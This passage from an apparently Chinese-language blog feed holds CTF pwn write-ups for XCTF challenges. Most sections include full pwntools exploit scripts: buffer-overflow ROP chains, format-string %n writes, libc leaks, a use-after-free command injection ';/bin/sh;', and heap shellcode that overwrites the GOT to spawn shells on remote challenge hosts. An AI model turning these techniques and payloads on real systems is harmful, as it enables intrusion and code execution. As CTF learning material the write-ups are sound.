int_addr = 0x080493e1 8 pop_eax = 0x080bae06 9 read_addr= 0x0806CD5010 binsh_addr = 0x080EB58411 pop_edx_ecx_ebx = 0x0806e85012 13 payload = &#39;a&#39;*0x20 + p32(read_addr) + p32(pop_edx_ecx_ebx) + p32(0) + p32(binsh_addr) + p32(0x8)14 payload += p32(pop_eax) + p32(0xb) + p32(pop_edx_ecx_ebx) + p32(0) + p32(0) + p32(binsh_addr) + p32(int_addr)15 16 p.sendline(payload)17 p.send(&#39;/bin/sh\x00&#39;)18 p.interactive()19 p.close()</code></pre><h1 id="攻防世界"><a href="#攻防世界" class="headerlink" title="攻防世界"></a>攻防世界</h1><h2 id="get-shell"><a href="#get-shell" class="headerlink" title="get_shell"></a>get_shell</h2><p>先用checksec看一下</p><p><img src="https://i.loli.net/2021/01/30/UAB6ogdMHJmVli3.gif"></p><p>有NX防护（堆栈不可执行）</p><pre><code>栈溢出核心思想是通过局部变量覆盖函数返回地址来修改EIP和注入Shellcode，在函数返回时跳到Shellcode去执行。要防止这种攻击，最有效的办法就是让攻击者注入的Shellcode无法执行，这就是数据执行保护（Data Execution Prevention， DEP）安全机制的初衷。NX策略是使栈区域的代码无法执行。</code></pre><p>然后用nc连一下，ls查看目录，cat查看flag，就可以了</p><p><img src="https://i.loli.net/2021/01/30/wIm4G862jtc1efg.gif"></p><h2 id="when-did-you-born"><a href="#when-did-you-born" class="headerlink" title="when did you born"></a>when did you born</h2><p>扔进ida里，f5</p><p><img src="https://i.loli.net/2021/02/03/yeI3j6BuOU1Wcoq.gif"></p><p>就是说当v5=1926时，给你flag。但是直接输入1926会直接进不了函数</p><p>点击v5，看看 stack of main 界面</p><p><img src="https://i.loli.net/2021/02/03/J5LcX6jgTdGSOMY.gif"></p><p>我们可以利用v4来覆盖v5</p><p>脚本如下</p><p><img src="https://i.loli.net/2021/02/03/WpFZzlchgP3Lumk.gif"></p><h2 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello pwn"></a>hello pwn</h2><p>还是扔进ida</p><p><img src="https://i.loli.net/2021/02/03/36pg94VYWCFiDt8.gif"></p><p><img src="https://i.loli.net/2021/02/03/F1rNfBVOwMndi59.gif"></p><p>我们用 601068 来覆盖 60106c 就可以实现伪代码中的if语句。</p><p>写一下exp(这次是自己写的了^_^)</p><p><img src="https://i.loli.net/2021/02/03/tTdR8wSW1ixkmlp.gif"></p><h2 id="level-0"><a href="#level-0" class="headerlink" title="level 0"></a>level 0</h2><p>还是直接ida</p><p><img src="https://i.loli.net/2021/02/03/VyishoLW2CzX6kF.gif"></p><p>就到处看看，发现最后返回的函数</p><p><img src="https://i.loli.net/2021/02/03/EA4fdj5zG3L89lF.gif"></p><p>它读取了200个字节</p><p>再找找找到了callsystem这个函数</p><p><img src="https://i.loli.net/2021/02/03/hXvWylg1M7mUFZk.gif"></p><p>总是是发现关键了</p><p>buf这个字符数组的长度只有0x80，而我们可以输入0x200个字节</p><p>现在我们希望可以让主函数能返回到callsystem</p><p><img src="https://i.loli.net/2021/02/03/XfjVmtMl8Drs6kv.gif"></p><p>起始地址和返回地址相差0x88个字节，我们全部填充。然后返回</p><p>callsystem的地址</p><p><img src="https://i.loli.net/2021/02/03/rmOwKZfHQakS7b3.gif"></p><p><img src="https://i.loli.net/2021/02/03/tIj52wQD4MruNq9.gif"></p><p>最后写exp如下</p><p><img src="https://i.loli.net/2021/02/03/vLIUsiZbfwAWpDh.gif"></p><h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p>(好像对rop链有一点点感觉了)</p><p>扔进ida看看主函数，调用了_function函数，点进去，申请88h字节空间</p><p>但读取了100h。存在漏洞。</p><p><img src="https://i.loli.net/2021/02/03/hyawZbiSIBrkGD3.gif"><br><img src="https://i.loli.net/2021/02/03/rq3AoxhBMbJeGVW.gif"></p><p>到处找找，看到了system和/bin/sh 这就可以了。</p><p><img src="https://i.loli.net/2021/02/03/YzNVH5oydEuL3ki.gif"><br><img src="https://i.loli.net/2021/02/03/PFlz157YQXN4unR.gif"></p><p>最后写一下exp</p><pre><code>在这里我们需要向题目中输入若干内容，又观察到buf的长度为0x88，那么我们便可以构造出0x88长度的无关数据，然后再输入4个长度的垃圾数据以覆盖ebp，然后就是call system的地址以及/bin/sh的地址</code></pre><p><img src="https://i.loli.net/2021/02/03/ZSU5cufx7gmtBT6.gif"></p><h2 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h2><p>可以看出要让pwnme=8，可以得到flag<br><img src="https://i.loli.net/2021/02/05/x3F1AjMWkrJ8vGm.gif"></p><p>printf（&amp;s）这样的输入方式是不安全的</p><pre><code>假设，此时我们在编写程序时候，写成了下面的样子printf(&quot;Color %s, Number %d, Float %4.2f&quot;);此时我们可以发现我们并没有提供参数，那么程序会如何运行呢？程序照样会运行，会将栈上存储格式化字符串地址上面的三个变量分别解析为解析其地址对应的字符串解析其内容对应的整形值解析其内容对应的浮点值对于 2，3 来说倒还无妨，但是对于对于 1 来说，如果提供了一个不可访问地址，比如 0，那么程序就会因此而崩溃。这基本就是格式化字符串漏洞的基本原理了。</code></pre><p>exp如下</p><pre><code>from pwn import *p = remote(&#39;111.198.29.45&#39;,41816)p.recvuntil(&#39;please tell me your name:&#39;)p.sendline(&#39;qin&#39;)p.recvuntil(&#39;leave your message please:&#39;)p.sendline(p32(0x0804A068) + &#39;%4c%10$n&#39;)//将pwnme中的内容改为8//p32(0x0804A068)会输出四个字符，%4c也会输出四个字符//%10$n  将%n之前打印的字符数量放入指定地址内部//之前打印了8个字符，指定地址为偏移量为10的栈空间所指向的地址空间//所以pwnme所在的空间内容就被更改为之前所输出的字符数量8p.interactive()</code></pre><p>%10&amp;n 为距开始输入字符的位置偏移量为10<br><img src="https://i.loli.net/2021/02/05/WKDxAkMiq4neZJf.gif"></p><p>参考资料：</p><p><a href="https://blog.csdn.net/zz_Caleb/article/details/88980866">https://blog.csdn.net/zz_Caleb/article/details/88980866</a></p><p><a href="https://blog.csdn.net/qinying001/article/details/98527949">https://blog.csdn.net/qinying001/article/details/98527949</a></p><hr><h2 id="giao手进阶区"><a href="#giao手进阶区" class="headerlink" title="giao手进阶区"></a>giao手进阶区</h2><h2 id="forgot"><a href="#forgot" class="headerlink" title="forgot"></a>forgot</h2><p>在这里我们就是找到溢出了。</p><p><img src="https://i.loli.net/2021/02/07/L6RFChskJnK5y3D.gif"></p><p>88行，调用了一个指针，看来可以用v2 来覆盖 v3 .但是v14 却是变量</p><p>这又怎么办呢？？</p><p><img src="https://i.loli.net/2021/02/07/7w69ZcCMyn4qFVs.gif"></p><p>我那时是一个百度啊，就发现 别人发现 可以用大写字符覆盖v2.</p><p>四舍五入就是我发现的咯。</p><p>至于flag 的地址就在这里了<br><img src="https://i.loli.net/2021/02/07/3DcIzBKg7eTMGfu.gif"></p><p>最后写exp</p><p><img src="https://i.loli.net/2021/02/07/lsJ7tHpiO2BdRnF.gif"></p><p>最最后还有个疑问，v14不就还是等于1 。那(*(&amp;v3 + –v14))</p><p>这样不就多了个 1 .不会有问题吗?  （现在没有了）</p><h2 id="Mary-Morton"><a href="#Mary-Morton" class="headerlink" title="Mary_Morton"></a>Mary_Morton</h2><p>老规矩 进ida</p><p><img src="https://i.loli.net/2021/02/08/8WCTkYK97pGFZVg.gif">我的散装英语越来越地道了^_^</p><p>这里就是有溢出漏洞了</p><p><img src="https://i.loli.net/2021/02/08/38EBz1vFahjRQfs.gif"></p><p>现在我陷入了瓶颈。</p><p><img src="https://i.loli.net/2021/02/08/JQn2PEzBNV5avsZ.gif"></p><p>不过身为 <strong>面向百度的编程大师</strong> 总有他的办法。</p><p>经过一段<em>短暂</em>的时间，他明白了过来。</p><p><img src="https://i.loli.net/2021/02/08/qo2dvsNnQTmVg1M.gif"></p><p><strong>格式化字符串漏洞原理详解</strong><a href="https://blog.csdn.net/qq_43394612/article/details/84900668" title="格式化字符串漏洞原理详解">https://blog.csdn.net/qq_43394612/article/details/84900668</a></p><p>缺少canary的值，可以用格式化字符串漏洞来泄漏，buf和v2的位置在两个函数里都一样</p><p>首先看下我们输入时候的偏移</p><p><img src="https://i.loli.net/2021/02/08/VLdP7WmcAyMESna.gif"></p><p>canary的偏移地址，找到了。这个图就很直观，针不戳。</p><p><img src="https://i.loli.net/2021/02/08/GaOqn4ehScQK8TV.png"></p><p>直接将flag的地址覆盖到返回地址</p><p>最后就是写(chaoxi)flag的时间了</p><p><img src="https://i.loli.net/2021/02/08/g3iqsYdUQrDlxVN.gif"></p><p><img src="https://i.loli.net/2021/02/08/qo2dvsNnQTmVg1M.gif"></p><p><strong>格式化字符串漏洞原理详解</strong><a href="https://blog.csdn.net/qq_43394612/article/details/84900668" title="格式化字符串漏洞原理详解">https://blog.csdn.net/qq_43394612/article/details/84900668</a></p><h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><p>竟然没有附件，还以为是一道web题。</p><p>这种感觉就像是，家里的猫在汪汪汪地叫一样，又有点熟悉，有很陌生的奇怪啊。</p><p>那就看看网页里有什么吧。</p><p><img src="https://i.loli.net/2021/02/09/xIWAGT5QLhPdclm.gif"></p><p>一个16进制数。</p><p>没看懂。。。。。。</p><p>cv工程师开始百度。(ctrl+c &amp;&amp; ctrl+v)</p><pre><code>from pwn import *addr = 0x40060ddef fuzz(r, num, flag):    payload = &#39;a&#39; * num    if flag==1:        payload += p32(addr)    if flag==2:        payload += p64(addr)    r.recvuntil(&quot;&gt;&quot;)    r.sendline(payload)def main():    for i in range(1000):        print(i)        for j in range(3):            try:                r = remote(&quot;111.198.29.45&quot;, 46588)                fuzz(r, i, j)                text = r.recv()                print(&#39;text.len=&#39;+str(len(text))+&#39;text=&#39;+text)                print(&#39;num=&#39;+str(i)+&#39; flag=&#39;+str(j))                r.interactive()            except:                r.close()if __name__ == &#39;__main__&#39;:    main()</code></pre><p>看了半天，是用两个嵌套循环，依次试出数据打包方式（p32 or p64）和</p><p>cylib构造的长度.而开始给的16进制数就是flag所在地址了。原来如此，</p><p>这样不就懂了嘛。(中间的停顿用ctrl + c 断开连接)</p><p><img src="https://i.loli.net/2021/02/09/nQXIOAPh5HoKbiM.gif"></p><p>最后再详细了解一下FUZZ（就是用大量的输入去试？）</p><p><a href="https://blog.csdn.net/wcventure/article/details/82085251">https://blog.csdn.net/wcventure/article/details/82085251</a></p><h2 id="welpwn"><a href="#welpwn" class="headerlink" title="welpwn"></a>welpwn</h2><p>用物理公式换算一下，就会发现我做题 的速度和猪起床的速度差不多。</p><p>不过为这事怪猪，也让人家太情何以堪了。</p><p>这个写得不错。</p><p><a href="https://blog.csdn.net/seaaseesa/article/details/102944448">https://blog.csdn.net/seaaseesa/article/details/102944448</a></p><p> 输入buf，这里不存在溢出，然后进入echo方法，将buf复</p><p>制到s2，当遇到\x00就结束。这个条件会导致p64(addr)后面的内容被截</p><p>断（地址经p64包装后肯定会出现\0x00）。<br> 也就是说，s2只能复制buf前面32个单元的内容。为了使32位后面的内容</p><p>得以执行，我们需要在ret位置跳去执行四个pop指令，去掉buf前32位内</p><p>容（也就是复制到s2里面的这些内容），这样就能连贯执行32位之后的内</p><p>容了。</p><p>所以，目前payload = ‘A’ * 24 + p64(addr_pop4) </p><p>之后的东西，就是完全不懂了，还是看看别人的exp吧.什么泄露write地址 ，获取libc加载地址，看起来我是完全不懂嘛~【doge】</p><pre><code>#coding:utf8  from pwn import *  from LibcSearcher import *  context.log_level  = &#39;debug&#39;  sh = process(&#39;./pwnh13&#39;)  #sh = remote(&#39;111.198.29.45&#39;,51867)  elf = ELF(&#39;./pwnh13&#39;)  write_got = elf.got[&#39;write&#39;]  puts_plt = elf.plt[&#39;puts&#39;]  #此处有4条pop指令，用于跳过24字节  pop_24 = 0x40089C  #pop rdi的地址,用来传参，具体看x64的传参方式  pop_rdi = 0x4008A3  sh.recvuntil(&#39;Welcome to RCTF\n&#39;)  main_addr = 0x4007CD  #本题的溢出点在echo函数里,然而，当遇到0，就停止了数据的复制，因此我们需要pop_24来跳过24个字节  payload = &#39;a&#39;*0x18 + p64(pop_24) + p64(pop_rdi) + p64(write_got) + p64(puts_plt) + p64(main_addr)  sh.send(payload)  sh.recvuntil(&#39;\x40&#39;)  #泄露write地址  write_addr = u64(sh.recv(6).ljust(8,&#39;\x00&#39;))  libc = LibcSearcher(&#39;write&#39;,write_addr)  #获取libc加载地址  libc_base = write_addr - libc.dump(&#39;write&#39;)  #获取system地址  system_addr = libc_base + libc.dump(&#39;system&#39;)  #获取/bin/sh地址  binsh_addr = libc_base + libc.dump(&#39;str_bin_sh&#39;)  sh.recvuntil(&#39;\n&#39;)  payload = &#39;a&#39;*0x18 + p64(pop_24) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)  sh.send(payload)  sh.interactive()  </code></pre><p>这个exp怎么这么长啊？和程序员的头发一点也不搭。</p><h2 id="dice-game"><a href="#dice-game" class="headerlink" title="dice_game"></a>dice_game</h2><p>这是道猜数游戏（这年头还有人猜数，真够无聊的）</p><p>看一眼栈，wow~ ⊙o⊙，可以用buf覆盖。</p><p><img src="https://i.loli.net/2021/02/18/Cwa9YyclPKAj7Eg.gif"></p><p>只要猜中50次，就调用sub_B28函数，得到flag了</p><p><img src="https://i.loli.net/2021/02/18/PhD3aOVso9XZ1CM.gif"></p><p>于是我们将seed覆盖掉，并且去预测生成的随机数。</p><p>exp如下</p><p><img src="https://i.loli.net/2021/02/18/BC7D1dzlgHoWmTK.gif"></p><h2 id="stack2"><a href="#stack2" class="headerlink" title="stack2"></a>stack2</h2><p>这道题主要对gdb的调试，来找出偏移量。</p><p>首先，当 v13[v5] = v7 语句开始执行时，由汇编可以发现输入数字先存入栈中，经由eax,ecx最终存入eax所在地址，因此eax存储了数组在栈上的首地址，而ecx存储了输入的值（cl是ecx的低字段）现在我们找到了数组首地址。</p><p>至于返回地址则是return时esp的值，由调试可知。</p><p>然后首尾地址相减可得偏移。<br><img src="https://i.loli.net/2021/07/16/dfnSQ4OE5kmibaI.gif"></p><p><img src="https://i.loli.net/2021/07/16/dfnSQ4OE5kmibaI.gif"><br><img src="https://i.loli.net/2021/07/16/8rlsWxCgNEy1IYV.gif"><br><img src="https://i.loli.net/2021/07/16/NvPnK9WaVU62YCf.gif"><br><img src="https://i.loli.net/2021/07/16/NvPnK9WaVU62YCf.gif"></p><p>最后利用3. change number 来修改返回地址处的值，从而劫持程序流</p><pre><code> #！ /usr/bin/python3from pwn import *system_addr=0x080485AFleave_offset=0x84def write_addr(addr,va):    io.sendline(&quot;3&quot;)    io.recvuntil(&quot;which number to change:\n&quot;)    io.sendline(str(addr))    io.recvuntil(&quot;new number:\n&quot;)    io.sendline(str(va))    io.recvuntil(&quot;5. exit\n&quot;)io=remote(&#39;111.198.29.45&#39;,&#39;31725&#39;)io.recvuntil(&quot;How many numbers you have:\n&quot;)io.sendline(&quot;1&quot;)io.recvuntil(&quot;Give me your numbers\n&quot;)io.sendline(&quot;1&quot;)io.recvuntil(&quot;5. exit\n&quot;)# write  system_addr  0x08048450write_addr(leave_offset,0X50)write_addr(leave_offset+1,0X84)write_addr(leave_offset+2,0X04)write_addr(leave_offset+3,0X08)# sh_addr  0x08048987leave_offset+=8print leave_offsetwrite_addr(leave_offset,0x87)write_addr(leave_offset+1,0X89)write_addr(leave_offset+2,0X04)write_addr(leave_offset+3,0X08)io.sendline(&quot;5&quot;)io.interactive()</code></pre><h2 id="monkey"><a href="#monkey" class="headerlink" title="monkey"></a>monkey</h2><p>放进ida里一看，咱啥也不懂，啥也不敢问。危难之际，度年救驾。</p><p>原来是一个动态链接库？？？那就查看一下</p><pre><code>#!/usr/bin/env python#!/usr/bin/env python#coding:utf8from pwn import *context.log_level = &#39;debug&#39;process_name = &#39;./js&#39;# p = process([process_name], env=&#123;&#39;LD_LIBRARY_PATH&#39;:&#39;./&#39;&#125;)p = remote(&#39;111.200.241.244&#39;,46128)# elf = ELF(process_name)p.sendlineafter(&#39;js&gt; &#39;, &#39;os.system(\&#39;cat flag\&#39;)&#39;)p.interactive()</code></pre><p><img src="https://i.loli.net/2021/02/18/I93CgynWp6juMRH.gif"></p><h2 id="time-formatter"><a href="#time-formatter" class="headerlink" title="time_formatter"></a>time_formatter</h2><p><img src="https://i.loli.net/2021/02/19/ozJ5d8l6cpuUTIf.gif"></p><p>通过构造command，我们可以执行系统命令。所以对于ptr，我们希望他是这样的:’;/bin/sh;’  这样我们就能通过system方法执行/bin/sh。于是，接下来的工作就是如何让ptr等于我们需要的值。</p><p><img src="https://i.loli.net/2021/02/19/Z4kBTvKjsfGaEce.gif"></p><p>需要注意。ptr，也就是time format，他的输入时有字符检查的：</p><p><img src="https://i.loli.net/2021/02/19/9fvMFqJkEycHs24.gif"></p><p>可以看到，我们的“；”不在允许范围内，所以通过输入直接构建ptr是不可能的。</p><p>这道题目的突破点其实就在退出函数这里：</p><p><img src="https://i.loli.net/2021/02/19/beZ9RNHalyKjfBX.gif"></p><p>可以看到，退出函数堆ptr和value做了free，但是没有将他们指为null。所以，他们指向之前的堆块，虽然堆块已经被标记为空闲。看到这里，估计有人就能想到UAF了。UAF：use after free。利用堆被free后重新申请堆，会返回之前的堆地址的特性。可以做到突破一些限制。如本题。</p><p>思路：首先设置format，随便输入一个值。然后选择5，进入退出函数，这时ptr指向的堆会被free，但是，ptr依然指向这个堆。接着选择no，不退出，选择3，设置timezone。重点来了，设置timezone的时候，会申请堆，得到的堆地址是之前ptr free掉的，这时候，timezone和ptr都指向这块堆。因为timezone没有输入限制，我们可以把’;/bin/sh;’输入这块堆区，所以ptr所指向的堆的值就变成了了我们希望的了</p><p>利用use after free</p><p>选择1设置 格式化字符串 （malloc(n)）<br>选择3设置时区 (malloc(n))，传入参数/bin/sh，利用’’\将参数括起来，‘；’用来传参<br>选择5 退出 (选择否 ， 目的是 free上面的两个块)<br>选择3设置时区(消耗时区 free的块)<br>选择4设置时区 （使用格式化字符串free的块）</p><pre><code>#!/usr/bin/env pythonfrom pwn import *io = remote(&quot;111.200.241.244&quot;,&quot;58352&quot;)context.log_level = &#39;debug&#39;io.sendlineafter(&quot;&gt; &quot;,&quot;1&quot;)io.sendlineafter(&quot;Format: &quot;,&quot;A&quot;)io.sendlineafter(&quot;&gt; &quot;,&quot;5&quot;)io.sendlineafter(&quot;Are you sure you want to exit (y/N)? &quot;,&#39;N&#39;)io.sendlineafter(&quot;&gt; &quot;,&quot;3&quot;)io.sendlineafter(&quot;Time zone: &quot;,&quot;&#39;;/bin/sh;&#39;&quot;)io.sendlineafter(&quot;&gt; &quot;,&quot;4&quot;)io.interactive()</code></pre><h2 id="note-service2"><a href="#note-service2" class="headerlink" title="note-service2"></a>note-service2</h2><p>exp:</p><pre><code>#coding:utf8  from pwn import *  sh = process(&#39;./pwnh21&#39;)  #sh = remote(&#39;111.198.29.45&#39;,30061)  context(os=&#39;linux&#39;,arch=&#39;amd64&#39;)  def create(index,size,content):     sh.sendlineafter(&#39;your choice&gt;&gt;&#39;,&#39;1&#39;)     sh.sendlineafter(&#39;index:&#39;,str(index))     sh.sendlineafter(&#39;size:&#39;,str(size))     sh.sendafter(&#39;content:&#39;,content)  def delete(index):     sh.sendlineafter(&#39;your choice&gt;&gt;&#39;,&#39;4&#39;)     sh.sendlineafter(&#39;index:&#39;,str(index))  #rax = 0 jmp short next_chunk  code0 = (asm(&#39;xor rax,rax&#39;) + &#39;\x90\x90\xeb\x19&#39;)  #rax = 0x3B jmp short next_chunk  code1= (asm(&#39;mov eax,0x3B&#39;) + &#39;\xeb\x19&#39;)  #rsi = 0 jmp short next_chunk  code2 = (asm(&#39;xor rsi,rsi&#39;) + &#39;\x90\x90\xeb\x19&#39;)  #rdi = 0 jmp short next_chunk  code3 = (asm(&#39;xor rdx,rdx&#39;) + &#39;\x90\x90\xeb\x19&#39;)  #系统调用  code4 = (asm(&#39;syscall&#39;).ljust(7,&#39;\x90&#39;))  &#39;&#39;&#39;&#39;&#39;print len(code0) print len(code1) print len(code2) print len(code3) print len(code4) &#39;&#39;&#39;  create(0,8,&#39;a&#39;*7)  create(1,8,code1)  create(2,8,code2)  create(3,8,code3)  create(4,8,code4)  #删除第一个堆块  delete(0)  #把第一个堆块申请回来，存入指令，并且把堆指针赋值给数组的-8下标处(atoi的GOT表处)，即修改了atoi的GOT表  create(-8,8,code0)  #getshell  sh.sendlineafter(&#39;your choice&gt;&gt;&#39;,&#39;/bin/sh&#39;)  sh.interactive()  </code></pre><h2 id="pwn-100"><a href="#pwn-100" class="headerlink" title="pwn-100"></a>pwn-100</h2><p><a href="https://www.jianshu.com/p/463d2fafb538?utm_campaign=maleskine&utm_content=note&utm_medium=seo_notes&utm_source=recommendation">参考答案</a></p><p><a href="https://www.haowuliaoa.com/article/info/1326203.html">参考答案2</a></p><p>各个都是 超能力 啊？</p><p>全部都 <strong>超</strong> 出了我的 <strong>能力</strong></p><pre><code>#! /usr/bin/python#coding=utf-8from pwn import *io = remote(&#39;111.200.241.244&#39;,43647)elf = ELF(&quot;./pwn100&quot;)rop1 = 0x40075A rop2 = 0x400740 pop_rdi_ret = 0x400763start_addr = 0x400550puts_plt = elf.plt[&#39;puts&#39;]read_got = elf.got[&#39;read&#39;]binsh_addr = 0x601000def leak(addr):  payload = &quot;a&quot; * 0x48 + p64(pop_rdi_ret) + p64(addr) + p64(puts_plt) + p64(start_addr)  payload = payload.ljust(200, &quot;a&quot;)  io.send(payload)  io.recvuntil(&quot;bye~\n&quot;)  up = &quot;&quot;  content = &quot;&quot;  count = 0  while True:    c = io.recv(numb=1, timeout=0.5)    count += 1    if up == &#39;\n&#39; and c == &quot;&quot;:        content = content[:-1] + &#39;\x00&#39;        break    else:        content += c        up = c  content = content[:4]  log.info(&quot;%#x =&gt; %s&quot; % (addr, (content or &#39;&#39;).encode(&#39;hex&#39;)))  return contentd = DynELF(leak, elf = elf)sys_addr = d.lookup(&#39;system&#39;, &#39;libc&#39;)log.info(&quot;system_addr =&gt; %#x&quot;, sys_addr)payload  = &quot;a&quot; * 0x48 + p64(rop1) + p64(0) + p64(1) + p64(read_got) + p64(8) + p64(binsh_addr) + p64(1)payload += p64(rop2)payload += &quot;\x00&quot; * 56  payload += p64(start_addr)payload  = payload.ljust(200, &quot;a&quot;)io.send(payload)io.recvuntil(&quot;bye~\n&quot;)io.send(&quot;/bin/sh\x00&quot;)payload = &quot;a&quot; * 0x48 + p64(pop_rdi_ret) + p64(binsh_addr) + p64(sys_addr)payload = payload.ljust(200, &quot;a&quot;)io.send(payload)io.interactive()</code></pre><h2 id="反应釜开关控制"><a href="#反应釜开关控制" class="headerlink" title="反应釜开关控制"></a>反应釜开关控制</h2><p>小M在里一个私人矿厂中发现了一条TNT生产线中硝化反应釜的接口，反</p><p>应釜是一种反应设备，非常的不稳定，会因为很多原因造成损坏，导致</p><p>生产被迫停止。她怀疑这个工厂可能进行地下军火的制作，所以小M打</p><p>算通过把反应釜关闭掉来干扰这条TNT生产线的运行，但是反应釜有多</p><p>个闸门，得想办法帮她把闸门都关掉才行。</p><p>（挖藕，看起来有点恐怖份子那味了）</p><p>checksec 没有 canary保护</p><p><img src="https://i.loli.net/2021/02/23/HKFYroJBkODd3sE.gif"></p><p>这是个惊喜。！</p><p><img src="https://i.loli.net/2021/02/23/WVp4b9Avq8cwgKa.gif"></p><p>那么就通过V5来溢出了</p><p><img src="https://i.loli.net/2021/02/23/DBUauiG5N8cZtx2.gif"><br><img src="https://i.loli.net/2021/02/23/4VPXMbpKshjA83B.gif"></p><p>这exp倒简单。</p><p><img src="https://i.loli.net/2021/02/23/RqT85u3fBimkyAo.gif"></p><p><img src="https://i.loli.net/2021/02/23/vnUTRJd9jH8iBae.gif"></p><p>看到有大佬这么。盲打？（啥意思？）</p><p><img src="https://i.loli.net/2021/02/23/tp5R6WMkyPUqLNJ.png"></p><h2 id="实时数据监测"><a href="#实时数据监测" class="headerlink" title="实时数据监测"></a>实时数据监测</h2><p>小A在对某家医药工厂进行扫描的时候，发现了一个大型实时数据库系</p><p>统。小A意识到实时数据库系统会采集并存储与工业流程相关的上千节</p><p>点的数据，只要登录进去，就能拿到有价值的数据。小A在尝试登陆实</p><p>时数据库系统的过程中，一直找不到修改登录系统key的方法，虽然她</p><p>现在收集到了能够登陆进系统的key的值，但是只能想别的办法来登陆</p><p><img src="https://i.loli.net/2021/02/23/GnUtVuiRdT136HM.gif"></p><p>没有任何防护，值得表扬。</p><p>还进ida</p><p><img src="https://i.loli.net/2021/02/23/yAdcw1J3hKG27Mv.gif"></p><p>这个imagemagic 点进去就是个printf函数，所以存在格式化字符串</p><p>漏洞。</p><p><img src="https://i.loli.net/2021/02/23/RQmzGNhK1tHVJ54.gif"></p><p>还给出了key的地址，就很贴心。</p><p>我们来看看偏移–数一下是12</p><p>现在就可以覆盖key的值。</p><p>exp如下</p><p><img src="https://i.loli.net/2021/02/23/UIVfZzGYCwcP7Jb.gif"></p><p>##greeting-150</p><p>首先查看ida,可以发现是格式化字符串漏洞，可以实现任意地址的读写</p><p><img src="https://i.loli.net/2021/07/30/zArwSxqipkOWEJM.gif"></p><p>但是，函数没有循环，那么我们就需要进行构造。</p><p>函数结束后都会调用.fini_array函数。所以我们可以修改该函数位start函数，从而使函数循环。</p><p>然后再修改strlen_got的地址为system_plt的地址（因为在getnline函数中调用了strlen函数并且都传入一个参数）</p><p><img src="https://i.loli.net/2021/07/30/8AP7eOdbGak9zcZ.gif"></p><p>由调试可知输入“aa”进行对齐后strlen_got在第12个参数，而覆盖它的数值计算如下：</p><p>‘Nice to meet you, ‘18字节</p><p>四个地址=4*4 = 16字节</p><p>“aa” 两个字节</p><p>0x804 - 18 - 16 -2 =2016</p><p>所以参数为%2016c%12$hn。<br>剩下的以此类推。</p><p>最后调用strlen函数时传入/bin/sh即可 getshell</p><p>exp如下</p><pre><code>#! /usr/bin/python3from pwn import *#context.log_level=&#39;debug&#39;#io=remote(&quot;111.200.241.244&quot;,61999)io=process(&quot;./greeting-150&quot;)elf=ELF(&quot;./greeting-150&quot;)strlen_got=elf.got[&#39;strlen&#39;]fini_got=0x08049934start_addr=0x80484f0system_plt = elf.plt[&#39;system&#39;]print(&quot;strlen:    &quot;+str(hex(strlen_got)))print(&quot;system_plt:&quot;+str(hex(system_plt)))print(&quot;fini_got:  &quot;+str(hex(fini_got)))print(&quot;start_addr:&quot;+str(hex(start_addr)))print(len(&#39;Nice to meet you, &#39;))payload=b&quot;aa&quot;payload+=p32(strlen_got+2)payload+=p32(fini_got+2)payload+=p32(strlen_got)payload+=p32(fini_got)payload+=b&quot;%2016c%12$hn%13$hn&quot;payload+=b&quot;%31884c%14$hn&quot;payload+=b&quot;%96c%15$hn&quot;#gdb.attach(io)io.sendline(payload)io.sendline(&quot;/bin/sh&quot;)io.interactive()--------</code></pre><p>##pwn1</p><p>这道题就说两点</p><p>1</p><pre><code>puts遇到\x00停止标志位最后两位一定是\x00 sendline末尾自动加上\n 覆盖掉\x00   我们可以利用这个漏洞泄露libc_base</code></pre><p>2</p><pre><code>one_gadget的运用方式它可以直接把运行shell的地址找出来</code></pre><p><img src="https://i.loli.net/2021/08/01/I9HFaEghJTl2Obr.png"></p><pre><code>#! /usr/bin/python3from pwn import *context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;elf = ELF(&quot;./babystack&quot;)p = remote(&#39;111.200.241.244&#39;,&#39;60084&#39;)#p = process(&quot;./babystack&quot;)libc = ELF(&quot;./libc-2.23.so&quot;)execve = 0x45216main_addr = 0x400908puts_got = elf.got[&#39;puts&#39;]puts_plt = elf.plt[&#39;puts&#39;]pop_rdi = 0x0400a93payload = b&#39;a&#39;*0x88p.sendlineafter(&quot;&gt;&gt; &quot;,&quot;1&quot;)p.sendline(payload)p.sendlineafter(&quot;&gt;&gt; &quot;,&quot;2&quot;)p.recvuntil(&#39;a&#39;*0x88+&#39;\n&#39;)canary = u64(p.recv(7).rjust(8,b&#39;\x00&#39;))payload1 = b&#39;a&#39;*0x88+p64(canary)+b&#39;a&#39;*8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)p.sendlineafter(&quot;&gt;&gt; &quot;,&quot;1&quot;)p.send(payload1)p.sendlineafter(&quot;&gt;&gt; &quot;,&quot;3&quot;)puts_addr=u64(p.recv(8).ljust(8,b&#39;\x00&#39;))execve_addr = puts_addr - (libc.symbols[&#39;puts&#39;] - execve)payload2 = b&#39;a&#39;*0x88+p64(canary)+b&#39;a&#39;*8 + p64(execve_addr)p.sendlineafter(&quot;&gt;&gt; &quot;,&quot;1&quot;)p.sendline(payload2)p.sendlineafter(&quot;&gt;&gt; &quot;,&quot;3&quot;)p.interactive()</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞类型&quot;&gt;&lt;a href=&quot;#漏洞类型&quot; class=&quot;headerlink&quot; title=&quot;漏洞类型&quot;&gt;&lt;/a&gt;漏洞类型&lt;/h1&gt;&lt;h2 id=&quot;格式化字符串漏洞&quot;&gt;&lt;a href=&quot;#格式化字符串漏洞&quot; class=&quot;headerlink&quot; title=&quot;格</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>三个访问Google的方式</title>
    <link href="http://example.com/2020/12/02/%E4%B8%89%E4%B8%AA%E8%AE%BF%E9%97%AE%E8%B0%B7%E6%AD%8C%E7%9A%84%E6%96%B9%E5%BC%8F/"/>
    <id>http://example.com/2020/12/02/%E4%B8%89%E4%B8%AA%E8%AE%BF%E9%97%AE%E8%B0%B7%E6%AD%8C%E7%9A%84%E6%96%B9%E5%BC%8F/</id>
    <published>2020-12-01T18:03:36.851Z</published>
